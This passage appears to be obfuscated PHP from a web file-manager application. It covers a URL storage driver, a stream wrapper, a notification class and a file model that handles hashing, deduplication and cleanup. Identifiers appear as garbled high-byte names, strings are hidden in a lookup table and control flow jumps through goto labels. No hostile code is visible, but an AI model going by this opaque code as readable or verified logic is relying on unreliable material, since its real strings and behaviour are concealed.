$ÔùÈ•ı·[$óİÊˆ½ø][$€¡­Á ”] = Action($ÇôÄÛĞ‰[1187])->shareItemInfo($Ã§ëÜ×í); } } return $ÔùÈ•ı·; } } class PathDriverEDS extends PathDriverMinIO { public function __construct($µ¤µÓË–) { parent::__construct($µ¤µÓË–); } } goto E¼–´ó”Ù¾; E¥÷Š„…ó»: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($İö É’ë = false) { } public function exist($Ó…»ß¯ó) { $Â ä™Ïà = $this->info($Ó…»ß¯ó); return $Â ä™Ïà[$_SERVER[şÒÁøÒÄ][202]]; } public function isFile($ô“Œ³½) { $Çê²äÒ = $this->info($ô“Œ³½); return $Çê²äÒ[$_SERVER[şÒÁøÒÄ][202]]; } public function isFolder($¡ñúˆ) { return !1; } public function size($¼ÉÏµ½ù) { $ù¥¾¢…ê = $this->info($¼ÉÏµ½ù); return $ù¥¾¢…ê[$_SERVER[şÒÁøÒÄ][76]]; } public function info($÷»É¡‡ê) { return $this->infoParse($÷»É¡‡ê); } public function infoAuth($¨áØ±ó) { return $this->infoParse($¨áØ±ó); } public function infoWithChildren($í Áîç•) { return $this->infoParse($í Áîç•); } public function infoFull($ ·ä˜øü) { return $this->infoParse($ ·ä˜øü); } private function infoParse($å ¢’) { $Ò›ÎªÚ =& $_SERVER[şÒÁøÒÄ]; $—±ì¬ù´ = $this->header($å ¢’); if (!$—±ì¬ù´ || !$—±ì¬ù´[$Ò›ÎªÚ[757]]) { return !1; } $¤ŸùëÛµ = _get($—±ì¬ù´, $Ò›ÎªÚ[337], 0); $¨èğåî” = array($Ò›ÎªÚ[32] => $—±ì¬ù´[$Ò›ÎªÚ[32]], $Ò›ÎªÚ[84] => $å ¢’, $Ò›ÎªÚ[33] => $Ò›ÎªÚ[200], $Ò›ÎªÚ[76] => intval($¤ŸùëÛµ), $Ò›ÎªÚ[174] => get_path_ext($—±ì¬ù´[$Ò›ÎªÚ[32]]), $Ò›ÎªÚ[1405] => $¤ŸùëÛµ > 0 && $—±ì¬ù´[$Ò›ÎªÚ[1527]], $Ò›ÎªÚ[1406] => !1); return $¨èğåî”; } private function header($Éêª‹õ) { $õÁ±ôÀÃ =& $_SERVER[şÒÁøÒÄ]; if (isset(self::$_cacheHeader[$Éêª‹õ])) { return self::$_cacheHeader[$Éêª‹õ]; } $åá‡Î±‹ = isset($GLOBALS[$õÁ±ôÀÃ[1528]]) ? $GLOBALS[$õÁ±ôÀÃ[1528]] : !1; $GLOBALS[$õÁ±ôÀÃ[1528]] = !0; self::$_cacheHeader[$Éêª‹õ] = url_header($Éêª‹õ); $GLOBALS[$õÁ±ôÀÃ[1528]] = $åá‡Î±‹; return self::$_cacheHeader[$Éêª‹õ]; } public function hashSimple($¢¼Í¶Ú‘, $¹‹ù¿œå = false) { $³«™ëŸˆ =& $_SERVER[şÒÁøÒÄ]; $´ğ¹Ï» = $this->info($¢¼Í¶Ú‘); if (!$´ğ¹Ï» || !$´ğ¹Ï»[$³«™ëŸˆ[202]]) { return !1; } $òõ”ÚÂ = $´ğ¹Ï»[$³«™ëŸˆ[76]]; $ÖÎ¼±Ø = 200; $åÄÏßš· = 50; if ($òõ”ÚÂ <= $ÖÎ¼±Ø * $åÄÏßš·) { return md5($this->fileSubstr($¢¼Í¶Ú‘, 0, $òõ”ÚÂ)) . $òõ”ÚÂ; } $çùœ‘¹÷ = intval($òõ”ÚÂ / $åÄÏßš·); $šíß = $³«™ëŸˆ[12]; $Ãõ—ıÙâ = timeFloat(); $÷°Æ¶Š¨ = 15; for ($ıİ¤ÇÓ€ = 0; $ıİ¤ÇÓ€ < $åÄÏßš·; $ıİ¤ÇÓ€++) { if (timeFloat() - $Ãõ—ıÙâ > $÷°Æ¶Š¨) { return !1; } $×Î€«ÇÜ = $this->fileSubstr($¢¼Í¶Ú‘, $çùœ‘¹÷ * $ıİ¤ÇÓ€, $ÖÎ¼±Ø); if (!$×Î€«ÇÜ) { return !1; } $šíß .= $×Î€«ÇÜ; } $šíß .= $this->fileSubstr($¢¼Í¶Ú‘, $òõ”ÚÂ - $ÖÎ¼±Ø, $ÖÎ¼±Ø); return md5($šíß) . $òõ”ÚÂ; } public function getContent($ŒåÒßå) { return $this->fileSubstr($ŒåÒßå); } public function fileSubstr($òÇ™»”„, $®ƒó”«ˆ = 0, $ÓÓŒÛ¢ = -1) { $ñèæõÕ =& $_SERVER[şÒÁøÒÄ]; $¦ÄƒšÙ­ = $this->info($òÇ™»”„); if (!$¦ÄƒšÙ­ || !$¦ÄƒšÙ­[$ñèæõÕ[202]] && $¦ÄƒšÙ­[$ñèæõÕ[76]] > 1024 * 1024 * 10) { return !1; } if ($ÓÓŒÛ¢ === -1) { $ÓÓŒÛ¢ = $¦ÄƒšÙ­[$ñèæõÕ[76]]; } if ($ÓÓŒÛ¢ == 0) { return $ñèæõÕ[12]; } $Í—‰•üÆ = array($ñèæõÕ[1529] . $®ƒó”«ˆ . $ñèæõÕ[790] . ($®ƒó”«ˆ + $ÓÓŒÛ¢ - 1)); $æÚ€À‹¾ = url_request($òÇ™»”„, $ñèæõÕ[230], !1, $Í—‰•üÆ, !1, !1, 30); return $æÚ€À‹¾[$ñèæõÕ[1215]] ? $æÚ€À‹¾[$ñèæõÕ[1215]] : $ñèæõÕ[12]; } public function download($äò…÷û, $ö¼Ëæ½) { Downloader::start($äò…÷û, $ö¼Ëæ½); return $ö¼Ëæ½; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($œ›™îÜ£, $¡€Ÿõ = '') { $this->info = $this->info($œ›™îÜ£); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[şÒÁøÒÄ][84]]; $this->pathOpen = $œ›™îÜ£; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$œ›™îÜ£])) { self::$_chunkBuffer[$œ›™îÜ£] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($£İ’Ôä») { $§ø§¤Œ = $this->fileSubstr($this->pose, $£İ’Ôä»); $this->pose += strlen($§ø§¤Œ); return $§ø§¤Œ; } public function stream_tell() { return $this->pose; } public function stream_seek($³ßËü±â, $×’¯œËø) { $™°Î“‚¿ =& $_SERVER[şÒÁøÒÄ]; if ($×’¯œËø == SEEK_SET) { $this->pose = $³ßËü±â; } else { if ($×’¯œËø == SEEK_CUR) { $this->pose += $³ßËü±â; } else { if ($×’¯œËø == SEEK_END) { $this->pose = $this->info[$™°Î“‚¿[76]] + intval($³ßËü±â); } } } if ($³ßËü±â < 0) { $this->pose = $this->info[$™°Î“‚¿[76]] + $³ßËü±â; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[şÒÁøÒÄ][76]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($Õ¨´ÖÂ–, $˜•†üÖù) { $„âú ô¨ =& $_SERVER[şÒÁøÒÄ]; $ËàÚßùÀ = $this->info($Õ¨´ÖÂ–); return array($„âú ô¨[1530] => 0, $„âú ô¨[1531] => 0, $„âú ô¨[16] => 32768 + 511, $„âú ô¨[1532] => 0, $„âú ô¨[1533] => 0, $„âú ô¨[1534] => 0, $„âú ô¨[1535] => 0, $„âú ô¨[76] => $ËàÚßùÀ[$„âú ô¨[76]], $„âú ô¨[1536] => $ËàÚßùÀ[$„âú ô¨[1404]], $„âú ô¨[1492] => $ËàÚßùÀ[$„âú ô¨[85]], $„âú ô¨[1491] => $ËàÚßùÀ[$„âú ô¨[201]], $„âú ô¨[1537] => 0, $„âú ô¨[1538] => 0); } static $fileInfo = array(); public function info($Èë™Ÿº›) { $Äª‡·³È = $_SERVER[şÒÁøÒÄ][1539]; if (isset(self::$fileInfo[$Èë™Ÿº›])) { return self::$fileInfo[$Èë™Ÿº›]; } if (substr($Èë™Ÿº›, 0, strlen($Äª‡·³È)) != $Äª‡·³È) { return !1; } self::$fileInfo[$Èë™Ÿº›] = IO::info(substr($Èë™Ÿº›, strlen($Äª‡·³È))); return self::$fileInfo[$Èë™Ÿº›]; } public static function read($òÖì”Ï, $ôˆÆ©øç, $ÜÄÛ…‹) { if (!isset(self::$_fopenCache[$òÖì”Ï])) { $í›çÔëª = new StreamWrapperIO(); $í›çÔëª->stream_open($òÖì”Ï); self::$_fopenCache[$òÖì”Ï] = $í›çÔëª; } $í›çÔëª = self::$_fopenCache[$òÖì”Ï]; return $í›çÔëª->fileSubstr($ôˆÆ©øç, $ÜÄÛ…‹); } public static function _read($º†–ë´‡, $ŒêÖ¬§¹, $òï†ç£Ñ) { $²›òÇğ¬ =& $_SERVER[şÒÁøÒÄ]; $´›ƒÚĞä = fopen($º†–ë´‡, $²›òÇğ¬[1408]); if (!$´›ƒÚĞä) { return $²›òÇğ¬[12]; } $ü®—âè = 8192; fseek($´›ƒÚĞä, $ŒêÖ¬§¹, SEEK_SET); $õôÓ« = $²›òÇğ¬[12]; $›ı¼ëã² = 0; while ($›ı¼ëã² < $òï†ç£Ñ) { $ôÖñÙ·Ì = min($ü®—âè, $òï†ç£Ñ - $›ı¼ëã²); $õôÓ« .= fread($´›ƒÚĞä, $ôÖñÙ·Ì); $›ı¼ëã² += $ôÖñÙ·Ì; } fclose($´›ƒÚĞä); return $õôÓ«; } public function fileSubstr($à©Æ¶†¡, $ğ’›Ú‰ ) { $–ÂŞÇÅ =& $_SERVER[şÒÁøÒÄ]; $©Á¡ê = $this->info[$–ÂŞÇÅ[76]]; $ç Õ³ = $à©Æ¶†¡; $¬º»¬¸’ = $ğ’›Ú‰ ; if ($à©Æ¶†¡ < 0) { $à©Æ¶†¡ = $©Á¡ê + $à©Æ¶†¡; } if ($ğ’›Ú‰  === !1) { $ğ’›Ú‰  = $©Á¡ê - $à©Æ¶†¡; } if ($à©Æ¶†¡ + $ğ’›Ú‰  > $©Á¡ê) { $ğ’›Ú‰  = $©Á¡ê - $à©Æ¶†¡; } if ($ğ’›Ú‰  <= 0) { return $–ÂŞÇÅ[12]; } if ($à©Æ¶†¡ < 0 || $à©Æ¶†¡ >= $©Á¡ê || $ğ’›Ú‰  <= 0 || $ğ’›Ú‰  > 1024 * 1024 * 10) { throw new Exception("\151\x6f\x46\151\x6c\x65\122\145\x61\x64\x20\145\162\162\157\162\x21\40\163\x74\x61\x72\x74\75{$à©Æ¶†¡}\73\154\x65\x6e\147\164\150\75{$ğ’›Ú‰ }\73\40\163\151\172\145\x3d{$©Á¡ê}\73"); } $®³’Ù¨â = 64 * 1024; $¥ëƒ¢ · =& self::$_chunkBuffer[$this->path]; if (!$¥ëƒ¢ ·) { $¥ëƒ¢ · = array(); } $æ³ÃŠ‡ğ = 0; $µ“Å²¯— = 0; $Ìî¥“ô‰ = $–ÂŞÇÅ[12]; foreach ($¥ëƒ¢ · as $æ³ÃŠ‡ğ => $Ìî¥“ô‰) { $æ³ÃŠ‡ğ = intval($æ³ÃŠ‡ğ); $µ“Å²¯— = $æ³ÃŠ‡ğ + strlen($Ìî¥“ô‰); if ($à©Æ¶†¡ >= $µ“Å²¯—) { continue; } if ($à©Æ¶†¡ >= $æ³ÃŠ‡ğ && $à©Æ¶†¡ + $ğ’›Ú‰  <= $µ“Å²¯—) { return substr($Ìî¥“ô‰, $à©Æ¶†¡ - $æ³ÃŠ‡ğ, $ğ’›Ú‰ ); } break; } if (count($¥ëƒ¢ ·) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($–ÂŞÇÅ[1540], $–ÂŞÇÅ[1541] . count($¥ëƒ¢ ·) . "\73\163\164\x61\162\164\75{$à©Æ¶†¡}\54\x6c\145\156\147\x74\x68\x3d{$ğ’›Ú‰ }\73\160\157\163\145\72{$æ³ÃŠ‡ğ}\x7e{$µ“Å²¯—}"); throw new Exception($–ÂŞÇÅ[1542]); } $Û´’‹Ş = intval($à©Æ¶†¡ / $®³’Ù¨â) * $®³’Ù¨â; $ƒ™ñï¢Å = ceil(($à©Æ¶†¡ + $ğ’›Ú‰ ) / $®³’Ù¨â) * $®³’Ù¨â - $Û´’‹Ş; $ƒŒ—§„ª = IO::fileSubstr($this->path, $Û´’‹Ş, $ƒ™ñï¢Å); $¥ëƒ¢ ·[$Û´’‹Ş . $–ÂŞÇÅ[12]] = $ƒŒ—§„ª; ksort($¥ëƒ¢ ·); $Â¤±“ˆ¢ = substr($ƒŒ—§„ª, $à©Æ¶†¡ - $Û´’‹Ş, $ğ’›Ú‰ ); return $Â¤±“ˆ¢; } private function log($ó°£ÌÄ, $£Ş¿½·) { $ÕÒÌ¦ôï =& $_SERVER[şÒÁøÒÄ]; $Ç£Ö•¬Ø = timeFloat() - $this->timeStart; write_log(sprintf($ÕÒÌ¦ôï[1543], $ó°£ÌÄ, $this->info[$ÕÒÌ¦ôï[32]], $Ç£Ö•¬Ø, $£Ş¿½·), $ÕÒÌ¦ôï[1195]); } } class Message { function __construct() { } public function send($í“ÃÓÒš = '', $íŠµè…Õ = array(), $ò‰”µ = "\x74\145\170\x74") { $ĞÓ¦çû =& $_SERVER[şÒÁøÒÄ]; $…ˆÀª¡© = array($ĞÓ¦çû[33] => $ĞÓ¦çû[1544], $ĞÓ¦çû[762] => $í“ÃÓÒš); if (in_array($ò‰”µ, array($ĞÓ¦çû[1544], $ĞÓ¦çû[1545]))) { $…ˆÀª¡©[$ĞÓ¦çû[33]] = $ò‰”µ; } $íŠµè…Õ = array($ĞÓ¦çû[505] => isset($íŠµè…Õ[$ĞÓ¦çû[505]]) ? $íŠµè…Õ[$ĞÓ¦çû[505]] : $ĞÓ¦çû[12], $ĞÓ¦çû[590] => isset($íŠµè…Õ[$ĞÓ¦çû[590]]) ? $íŠµè…Õ[$ĞÓ¦çû[590]] : $ĞÓ¦çû[12]); if (empty($í“ÃÓÒš) || empty($íŠµè…Õ[$ĞÓ¦çû[505]]) && empty($íŠµè…Õ[$ĞÓ¦çû[590]])) { return !1; } $Ö“ÔÕË² = array($ĞÓ¦çû[1485] => $…ˆÀª¡©, $ĞÓ¦çû[1546] => $íŠµè…Õ); Hook::trigger($ĞÓ¦çû[1547], $Ö“ÔÕË²); } } goto bÓĞÈè¨˜; f°¼Œ‚‚¹: class FileModel extends ModelBase { protected $tableName = "\x69\x6f\137\x66\151\154\145"; protected $tableMeta = array("\164\141\142\154\145\116\141\x6d\x65" => "\151\157\137\146\x69\x6c\x65\x5f\155\145\x74\x61", "\x6d\x65\164\x61\106\151\145\154\x64" => "\x66\x69\x6c\145\111\104"); public function fileInfo($ óÈÜùï) { $“µÇÜºõ =& $_SERVER[şÒÁøÒÄ]; static $ÃÎÓ¨Êî = array(); if (!isset($ÃÎÓ¨Êî[$ óÈÜùï])) { $¾ûÃá° = $“µÇÜºõ[1918]; $ãƒ¦•çĞ = Model($“µÇÜºõ[471])->field($¾ûÃá°)->where(array($“µÇÜºõ[469] => $ óÈÜùï))->find(); $ÃÎÓ¨Êî[$ óÈÜùï] = $ãƒ¦•çĞ; } return $ÃÎÓ¨Êî[$ óÈÜùï]; } public function addFileByContent($ˆø­‹‚Ê = '', $œ¥àªÔ£ = '') { $Î³á½óÉ =& $_SERVER[şÒÁøÒÄ]; $¹½­üÍ = TEMP_PATH . $Î³á½óÉ[1919]; if (!is_dir($¹½­üÍ)) { mk_dir($¹½­üÍ); } $ûÃè•± = $¹½­üÍ . $Î³á½óÉ[1920] . rand_string(16); file_put_contents($ûÃè•±, $ˆø­‹‚Ê); $ÑÄæ¯ƒ™ = $this->addFile($ûÃè•±, $œ¥àªÔ£, !0); if (file_exists($ûÃè•±)) { @unlink($ûÃè•±); } return $ÑÄæ¯ƒ™; } public function createFileName($ÈÃªøšİ, $÷·€Ò‘ê = false, $“İ·Ÿ„Á = false) { $“Ù¶º«Ù =& $_SERVER[şÒÁøÒÄ]; $ĞéÏ£—§ = IO::init($“Ù¶º«Ù[8]); $ìóäîªØ = $this->makeFilePath($ÈÃªøšİ, $ĞéÏ£—§, $÷·€Ò‘ê, $“İ·Ÿ„Á); $Ÿãğùğï = $ĞéÏ£—§->pathFather($ìóäîªØ); static $»æ†ğ’è = false; $äæñÅÒ = $“Ù¶º«Ù[1921] . md5($Ÿãğùğï); if (!$»æ†ğ’è && !Cache::get($äæñÅÒ)) { $»æ†ğ’è = !0; $àÆ¨ÂçÍ = IO::mkdir($Ÿãğùğï); if (!IO::exist($àÆ¨ÂçÍ . $“Ù¶º«Ù[805])) { IO::mkfile($àÆ¨ÂçÍ . $“Ù¶º«Ù[805]); } Cache::set($äæñÅÒ, 1, 3600 * 2); } return $ìóäîªØ; } public function makeFilePath($ĞæÏØ¦Ÿ, $³í´æ¬, $òÓ›íã£ = false, $ŞµÕì¼¼ = false) { $²ÛÚäâø =& $_SERVER[şÒÁøÒÄ]; $ï¢·Ç†ä = Model($²ÛÚäâø[778])->get($²ÛÚäâø[1922]); $™±Ì§ìÊ = KodIO::defaultIO() . date($²ÛÚäâø[1923]); $äøÓóäˆ = $™±Ì§ìÊ . rand_string(5) . short_id(100); $ĞæÏØ¦Ÿ = str_replace($²ÛÚäâø[8], $²ÛÚäâø[11], KodIO::clear($ĞæÏØ¦Ÿ)); $µ“–¾òô = $³í´æ¬->ext($ĞæÏØ¦Ÿ); if (!$ĞæÏØ¦Ÿ) { $ï¢·Ç†ä = $²ÛÚäâø[1924]; } switch ($ï¢·Ç†ä) { case $²ÛÚäâø[1925]: $äøÓóäˆ = $äøÓóäˆ . $²ÛÚäâø[10] . $³í´æ¬->ext($ĞæÏØ¦Ÿ); if ($µ“–¾òô == $²ÛÚäâø[1862]) { $äøÓóäˆ .= $²ÛÚäâø[1219]; } break; case $²ÛÚäâø[1926]: $€ÅÄÇœŞ = Model($²ÛÚäâø[778])->get($²ÛÚäâø[779]); $”ô Ä = substr(md5($²ÛÚäâø[780] . $€ÅÄÇœŞ . date($²ÛÚäâø[755])), 0, 8); $êœÙ€¸§ = KodIO::defaultDriver(); $™±Ì§ìÊ = $²ÛÚäâø[1250] . $êœÙ€¸§[$²ÛÚäâø[399]] . $²ÛÚäâø[409] . date($²ÛÚäâø[1927]) . $”ô Ä . $²ÛÚäâø[8]; if ($µ“–¾òô == $²ÛÚäâø[1862]) { $ĞæÏØ¦Ÿ .= $²ÛÚäâø[1219]; } $¸ÛŞæ²Š = $²ÛÚäâø[1928] . $™±Ì§ìÊ . $ĞæÏØ¦Ÿ; CacheLock::lock($¸ÛŞæ²Š); $äøÓóäˆ = $™±Ì§ìÊ . $ĞæÏØ¦Ÿ; if (IO::exist($™±Ì§ìÊ . $ĞæÏØ¦Ÿ)) { $ÆıˆÃµ = substr($ĞæÏØ¦Ÿ, 0, strlen($ĞæÏØ¦Ÿ) - strlen($µ“–¾òô)); $àğÎšÀĞ = $ŞµÕì¼¼ ? substr($ŞµÕì¼¼, 0, 5) : ($òÓ›íã£ ? substr($òÓ›íã£, 0, 5) : rand_string(5)); $äøÓóäˆ = $™±Ì§ìÊ . $ÆıˆÃµ . $àğÎšÀĞ . $²ÛÚäâø[10] . $µ“–¾òô; } if (IO::isTypeObject($äøÓóäˆ) && !IO::isUploadServer($äøÓóäˆ)) { if (IO::exist($äøÓóäˆ)) { return $äøÓóäˆ; } $Ç»Ê¸Œ¡ = IO::setContent($äøÓóäˆ, $²ÛÚäâø[12]); if (!$Ç»Ê¸Œ¡) { show_json($²ÛÚäâø[1929], !1); } } CacheLock::unlock($¸ÛŞæ²Š); break; case $²ÛÚäâø[1924]: break; default: break; } return $äøÓóäˆ; } public function addFileByRemote($ ÷³Õ»æ, $É¾Îò“, $ø¨âîƒ× = array()) { $­·ˆ”û =& $_SERVER[şÒÁøÒÄ]; if (!IO::exist($ ÷³Õ»æ)) { return !1; } $ø£æ’‚ = $ø¨âîƒ×[$­·ˆ”û[176]] ? $ø¨âîƒ×[$­·ˆ”û[176]] : $­·ˆ”û[12]; $Ãğ³ˆëñ = IO::hashMd5($ ÷³Õ»æ, $ø£æ’‚); $¸’Ç‚ÖÛ = KodIO::defaultDriver(); $’¥çŞÂä = array($­·ˆ”û[545] => IO::size($ ÷³Õ»æ), $­·ˆ”û[1930] => 1, $­·ˆ”û[420] => $É¾Îò“, $­·ˆ”û[816] => $¸’Ç‚ÖÛ[$­·ˆ”û[399]], $­·ˆ”û[421] => $ ÷³Õ»æ, $­·ˆ”û[1931] => $ø¨âîƒ×[$­·ˆ”û[177]] ? $ø¨âîƒ×[$­·ˆ”û[177]] : IO::hashSimple($ ÷³Õ»æ), $­·ˆ”û[1932] => $Ãğ³ˆëñ ? $Ãğ³ˆëñ : $ø£æ’‚); if ($Üış ÛÊ = $this->addFileCheckExist($’¥çŞÂä[$­·ˆ”û[177]], $’¥çŞÂä[$­·ˆ”û[176]], $’¥çŞÂä[$­·ˆ”û[76]])) { return $Üış ÛÊ; } return $this->addFileData($’¥çŞÂä); } private function addFileData($Ó¶êìò) { $ƒµ„µ‹¥ =& $_SERVER[şÒÁøÒÄ]; if (!$Ó¶êìò) { return !1; } $Ó¶êìò[$ƒµ„µ‹¥[76]] = intval($Ó¶êìò[$ƒµ„µ‹¥[76]]); if (!$Ó¶êìò[$ƒµ„µ‹¥[76]] && strlen($Ó¶êìò[$ƒµ„µ‹¥[177]]) > 32) { $Ó¶êìò[$ƒµ„µ‹¥[76]] = intval(substr($Ó¶êìò[$ƒµ„µ‹¥[177]], 32)); } $É¨¸äíÈ = $this->add($Ó¶êìò); return $this->find($É¨¸äíÈ); } public function addFile($ğÌıòÁÚ, $•ÆÁ‰¸–, $£è˜¿’Á = false) { $î¾ŒùÈĞ =& $_SERVER[şÒÁøÒÄ]; $ÀÜ……– = IO::hashSimple($ğÌıòÁÚ); $îÄš…ªü = IO::size($ğÌıòÁÚ); $à¬““Øœ = $îÄš…ªü <= 1024 * 1024 * 10 ? IO::hashMd5($ğÌıòÁÚ) : $î¾ŒùÈĞ[12]; $™²Ñ›ï = $î¾ŒùÈĞ[1933] . $ÀÜ……–; CacheLock::lock($™²Ñ›ï); if ($à¬““Øœ && $ÀÜ……–) { $º¾Íİ‚ = $this->addFileCheckExist($ÀÜ……–, $à¬““Øœ, $îÄš…ªü); if ($º¾Íİ‚) { CacheLock::unlock($™²Ñ›ï); return $º¾Íİ‚; } } $¥ş°şÏ = $this->addFileMake($ğÌıòÁÚ, $îÄš…ªü, $ÀÜ……–, $à¬““Øœ, $•ÆÁ‰¸–, $£è˜¿’Á); $î¡ ĞæÜ = $this->addFileData($¥ş°şÏ); CacheLock::unlock($™²Ñ›ï); if (!$à¬““Øœ && $î¡ ĞæÜ) { $this->fileMd5Check($î¡ ĞæÜ); } return $î¡ ĞæÜ; } private function fileMd5Check($æ˜ÃŒ) { $ü“§ğ–‡ =& $_SERVER[şÒÁøÒÄ]; $Ğ£ïÔŒô = array($æ˜ÃŒ[$ü“§ğ–‡[468]], $æ˜ÃŒ[$ü“§ğ–‡[84]]); $Œ‰€ı¸ë = $ü“§ğ–‡[1934] . $æ˜ÃŒ[$ü“§ğ–‡[84]]; $ÏŸç“™· = $ü“§ğ–‡[1935] . $æ˜ÃŒ[$ü“§ğ–‡[468]]; $³ı¢îçŠ = TaskQueue::add($ü“§ğ–‡[1936], $Ğ£ïÔŒô, $Œ‰€ı¸ë, $ÏŸç“™·); if (!$³ı¢îçŠ) { $this->fileMd5Set($æ˜ÃŒ[$ü“§ğ–‡[468]], $æ˜ÃŒ[$ü“§ğ–‡[84]]); } else { TaskQueue::addSubmit(); } } public function fileMd5Set($ùÄ€ˆ¼‘, $ãğõ­„•) { $„ÀÔÊë› =& $_SERVER[şÒÁøÒÄ]; $º¦îÁëŞ = $this->find($ùÄ€ˆ¼‘); if (!$º¦îÁëŞ || $º¦îÁëŞ[$„ÀÔÊë›[176]]) { return; } $Ãµº¼¤“ = IO::hashMd5($ãğõ­„•); if (!$Ãµº¼¤“) { return $„ÀÔÊë›[12]; } $this->where(array($„ÀÔÊë›[468] => $ùÄ€ˆ¼‘))->save(array($„ÀÔÊë›[176] => $Ãµº¼¤“)); } public function addFileMake($Éœ“›–Ù, $¥Õ¢µìÏ, $ÈÅÕÁù¢, $™Ã¹»°£, $ŞĞœûé¹, $†÷¤Ë¹) { $îªã =& $_SERVER[şÒÁøÒÄ]; $Ì‰Íë¶ê = $this->createFileName($ŞĞœûé¹, $ÈÅÕÁù¢, $™Ã¹»°£); $‚€ùƒÛ = get_path_father($Ì‰Íë¶ê); $Û¸¶‚É = get_path_this($Ì‰Íë¶ê); if ($†÷¤Ë¹) { $¬½Ûäó¿ = IO::move($Éœ“›–Ù, $‚€ùƒÛ, !1, $Û¸¶‚É); } else { $¬½Ûäó¿ = IO::copy($Éœ“›–Ù, $‚€ùƒÛ, !1, $Û¸¶‚É); } if (!$¬½Ûäó¿) { return !1; } $×®ÌôËó = KodIO::defaultDriver(); $ò†Œ„ğß = array($îªã[545] => $¥Õ¢µìÏ, $îªã[1930] => 1, $îªã[420] => $ŞĞœûé¹, $îªã[816] => $×®ÌôËó[$îªã[399]], $îªã[421] => $Ì‰Íë¶ê, $îªã[1931] => $ÈÅÕÁù¢, $îªã[1932] => $™Ã¹»°£); return $ò†Œ„ğß; } public function addFileCheckExist($óôŒ¥¤ˆ, $¡Àá½÷, $ºÚğ¹Æë) { $şÀÙÆ–Œ =& $_SERVER[şÒÁøÒÄ]; $À¬Ü±ñÂ = $this->findByHash($óôŒ¥¤ˆ, $¡Àá½÷); if (!$À¬Ü±ñÂ) { return !1; } $‰Æ½˜ƒ = array($şÀÙÆ–Œ[1930] => intval($À¬Ü±ñÂ[$şÀÙÆ–Œ[1937]]) + 1, $şÀÙÆ–Œ[545] => $ºÚğ¹Æë); $this->where(array($şÀÙÆ–Œ[469] => $À¬Ü±ñÂ[$şÀÙÆ–Œ[468]]))->save($‰Æ½˜ƒ); return $À¬Ü±ñÂ; } public function remove($¡®çŞßı) { $this->linkCountChange($¡®çŞßı, !1); $this->clearEmpty(); return !0; } public function linkAdd($Ó°ºÒÃ©) { $this->linkCountChange($Ó°ºÒÃ©, !0); } public function linkCountChange($·¨Œç, $‹¼ô¶É) { $³ä°ôã’ =& $_SERVER[şÒÁøÒÄ]; if (!$·¨Œç) { return; } if (!is_array($·¨Œç)) { $·¨Œç = array($·¨Œç); } $µù°ãÅ = array(); foreach ($·¨Œç as $ª‰Ííğ) { $—ÚÆ™ˆÆ = $ª‰Ííğ . $³ä°ôã’[12]; if (!$µù°ãÅ[$—ÚÆ™ˆÆ]) { $µù°ãÅ[$—ÚÆ™ˆÆ] = 0; } $µù°ãÅ[$—ÚÆ™ˆÆ]++; } $ÛÄâÅë = array(); foreach ($µù°ãÅ as $ª‰Ííğ => $¼Øª‚Ø) { $—ÚÆ™ˆÆ = $¼Øª‚Ø . $³ä°ôã’[12]; if (!$ÛÄâÅë[$—ÚÆ™ˆÆ]) { $ÛÄâÅë[$—ÚÆ™ˆÆ] = array(); } $ÛÄâÅë[$—ÚÆ™ˆÆ][] = $ª‰Ííğ; } foreach ($ÛÄâÅë as $¼Øª‚Ø => $Ë–‰´·Ö) { if (!$Ë–‰´·Ö) { continue; } $¼Øª‚Ø = $‹¼ô¶É ? $¼Øª‚Ø : -intval($¼Øª‚Ø); $¡ÉÍñ„ = array($³ä°ôã’[468] => array($³ä°ôã’[7], $Ë–‰´·Ö)); if ($¼Øª‚Ø < 0) { $¡ÉÍñ„[$³ä°ôã’[1937]] = array($³ä°ôã’[1028], abs($¼Øª‚Ø)); } $this->where($¡ÉÍñ„)->setAdd($³ä°ôã’[1937], $¼Øª‚Ø); } } public function findByHash($Ÿ³æÛ‚, $’†»Š§˜ = false) { $²şøáÓ =& $_SERVER[şÒÁøÒÄ]; if (!$Ÿ³æÛ‚ && !$’†»Š§˜) { return !1; } $ÏÄ£òÚí = array($²şøáÓ[1931] => $Ÿ³æÛ‚); if ($’†»Š§˜) { $ÏÄ£òÚí = array($²şøáÓ[1932] => $’†»Š§˜); } return $this->order($²şøáÓ[1938])->where($ÏÄ£òÚí)->find(); } public function clearEmpty($”›ë¥Ë = 0) { $…¡ñ›¼ã =& $_SERVER[şÒÁøÒÄ]; $´»Ò¨„Š = time() - 3600 * 24 * $”›ë¥Ë; $ˆïäˆªú = $…¡ñ›¼ã[1939] . $´»Ò¨„Š; $ÈûıÏ€ = $this->where($ˆïäˆªú)->select(); if (!$ÈûıÏ€) { return; } $ Ø·ö·ì = new Task($…¡ñ›¼ã[1940], $…¡ñ›¼ã[12], count($ÈûıÏ€)); foreach ($ÈûıÏ€ as $èÍ—ãò“) { $ Ø·ö·ì->update(1); $this->resetFile($èÍ—ãò“); } $ Ø·ö·ì->end(); } public function resetFile($òË ´) { $‹‡ïüº½ =& $_SERVER[şÒÁøÒÄ]; $ö‚å¥†ó = array($‹‡ïüº½[469] => $òË ´[$‹‡ïüº½[468]]); $…£†¥™Ã = Model($‹‡ïüº½[1352])->where($ö‚å¥†ó)->count(); $ÏÀïİöİ = Model($‹‡ïüº½[1941])->where($ö‚å¥†ó)->count(); $«âç¸‹— = intval($…£†¥™Ã) + intval($ÏÀïİöİ); if ($«âç¸‹— == 0) { IO::remove($òË ´[$‹‡ïüº½[84]]); Model($‹‡ïüº½[1942])->delete($òË ´[$‹‡ïüº½[468]]); $this->where($ö‚å¥†ó)->delete(); $this->metaSet($òË ´[$‹‡ïüº½[468]], null, null); return; } if ($òË ´[$‹‡ïüº½[1937]] != $«âç¸‹—) { $this->where($ö‚å¥†ó)->save(array($‹‡ïüº½[1930] => $«âç¸‹—)); } } public function storageInfo($ÔæÙ×µˆ = false) { 